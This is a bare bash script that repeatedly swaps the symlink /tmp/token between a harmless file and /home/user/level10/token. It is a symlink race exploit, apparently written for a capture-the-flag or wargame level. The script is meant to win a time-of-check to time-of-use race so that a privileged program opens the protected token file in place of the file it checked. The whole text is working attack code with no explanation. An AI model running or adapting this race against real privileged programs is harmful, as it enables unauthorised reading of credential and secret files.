#!/bin/bash

touch /tmp/file
while [ true ]
do
    ln -sf /tmp/file /tmp/token
    ln -sf /home/user/level10/token /tmp/token
done
